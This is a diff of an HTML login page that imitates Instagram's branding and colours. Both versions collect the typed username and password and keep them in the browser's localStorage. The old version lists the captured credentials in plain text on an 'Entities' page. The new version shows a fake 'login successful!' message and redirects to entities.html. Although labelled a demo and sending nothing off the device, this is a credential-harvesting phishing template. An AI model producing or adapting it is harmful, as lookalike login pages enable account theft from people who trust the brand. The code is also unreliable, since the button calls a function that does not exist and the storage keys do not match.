@@ -1,262 +1,125 @@
-```html
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>PhotoShare Demo</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title> Login</title>
 
-<style>
-*{box-sizing:border-box}
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
 
-body{
-    margin:0;
-    min-height:100vh;
-    background:#fafafa;
-    font-family:Arial,sans-serif;
-}
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
+    }
 
-.page{
-    min-height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-}
+    .box {
+      width: 350px;
+      background: white;
+      padding: 35px;
+      border-radius: 15px;
+      box-shadow: 0 15px 40px #0005;
+      text-align: center;
+    }
 
-.box{
-    width:350px;
-    background:white;
-    border:1px solid #ddd;
-    padding:35px;
-    text-align:center;
-}
+    h1 {
+      margin-bottom: 25px;
+    }
 
-.logo{
-    font-size:32px;
-    font-weight:bold;
-    margin-bottom:8px;
-}
+    input {
+      width: 100%;
+      padding: 13px;
+      margin: 8px 0;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      background: #fafafa;
+    }
 
-.demo{
-    color:#d00;
-    font-size:12px;
-    margin-bottom:25px;
-}
+    button {
+      width: 100%;
+      padding: 13px;
+      margin-top: 12px;
+      border: 0;
+      border-radius: 8px;
+      background: #0095f6;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+    }
 
-input{
-    width:100%;
-    padding:12px;
-    margin:5px 0;
-    border:1px solid #ddd;
-    border-radius:5px;
-}
+    button:hover {
+      background: #0077c8;
+    }
 
-button{
-    width:100%;
-    padding:12px;
-    margin-top:10px;
-    border:0;
-    border-radius:5px;
-    background:#3897f0;
-    color:white;
-    font-weight:bold;
-    cursor:pointer;
-}
-
-.entities{
-    display:none;
-    padding:30px;
-}
-
-.dashboard{
-    max-width:850px;
-    margin:auto;
-    background:white;
-    padding:25px;
-    border:1px solid #ddd;
-    border-radius:10px;
-}
-
-.entry{
-    border:1px solid #ddd;
-    padding:15px;
-    margin-top:12px;
-    border-radius:8px;
-}
-
-.time{
-    color:#777;
-    font-size:12px;
-    margin-top:7px;
-}
-
-.back{
-    width:150px;
-}
-</style>
+    .msg {
+      margin-top: 15px;
+      color: #555;
+    }
+  </style>
 </head>
 
 <body>
 
-<div class="page" id="loginPage">
+  <div class="box">
+    <h1>Demo Login</h1>
 
-    <div class="box">
+    <form id="loginForm">
+      <input
+        type="text"
+        id="username"
+        placeholder="username"
+        required
+      >
 
-        <div class="logo">PhotoShare</div>
+      <input
+        type="password"
+        id="password"
+        placeholder=" password"
+        required
+      >
 
-        <div class="demo">
-             INSTAGRAM
-        </div>
+      <button type="submit">Log In</button>
+    </form>
 
-        <input
-            id="username"
-            type="text"
-            placeholder=" username"
-        >
+    <div class="msg" id="message"></div>
+  </div>
 
-        <input
-            id="password"
-            type="password"
-            placeholder=" password"
-        >
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
 
-        <button onclick="save()">
-            Continue 
-        </button>
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
 
-    </div>
-
-</div>
-
-
-<div class="entities" id="entitiesPage">
-
-    <div class="dashboard">
-
-        <h1>Entities</h1>
-
-        <p>Saved  entries:</p>
-
-        <div id="list"></div>
-
-        <br>
-
-        <button class="back" onclick="showLogin()">
-            Back
-        </button>
-
-    </div>
-
-</div>
-
-
-<script>
-
-function saveDemo(){
-
-    const username =
-        document.getElementById("username").value.trim();
-
-    const password =
-        document.getElementById("password").value.trim();
-
-    if(!username || !password){
-        alert("Enter demo details first.");
-        return;
-    }
-
-    let entries =
-        JSON.parse(
-            localStorage.getItem("Entities") || "[]"
-        );
-
-    entries.push({
+      const entry = {
         username: username,
-        demoPassword: password,
+        password: password,
         time: new Date().toLocaleString()
+      };
+
+      let entries = JSON.parse(localStorage.getItem("Entries")) || [];
+
+      entries.push(entry);
+
+      localStorage.setItem("demoEntries", JSON.stringify(entries));
+
+      document.getElementById("message").textContent =
+        " login successful!";
+
+      setTimeout(() => {
+        window.location.href = "entities.html";
+      }, 800);
     });
-
-    localStorage.setItem(
-        "demoEntities",
-        JSON.stringify(entries)
-    );
-
-    document.getElementById("username").value="";
-    document.getElementById("password").value="";
-
-    showEntities();
-}
-
-
-function showEntities(){
-
-    document.getElementById("loginPage").style.display="none";
-
-    document.getElementById("entitiesPage").style.display="block";
-
-    loadEntities();
-}
-
-
-function loadEntities(){
-
-    const list =
-        document.getElementById("list");
-
-    const entries =
-        JSON.parse(
-            localStorage.getItem("Entities") || "[]"
-        );
-
-    list.innerHTML="";
-
-    if(entries.length === 0){
-
-        list.innerHTML="<p>No  entries yet.</p>";
-
-        return;
-    }
-
-    entries.forEach((entry,index)=>{
-
-        const div=document.createElement("div");
-
-        div.className="entry";
-
-        div.innerHTML=`
-            <b>Demo Entity #${index+1}</b><br><br>
-            Username: ${escapeHTML(entry.username)}
-            <br>
-            Demo Password: ${escapeHTML(entry.demoPassword)}
-            <div class="time">
-                ${escapeHTML(entry.time)}
-            </div>
-        `;
-
-        list.appendChild(div);
-    });
-}
-
-
-function showLogin(){
-
-    document.getElementById("entitiesPage").style.display="none";
-
-    document.getElementById("loginPage").style.display="flex";
-}
-
-
-function escapeHTML(value){
-
-    const div=document.createElement("div");
-
-    div.textContent=value;
-
-    return div.innerHTML;
-}
-
-</script>
+  </script>
 
 </body>
 </html>
-```
+
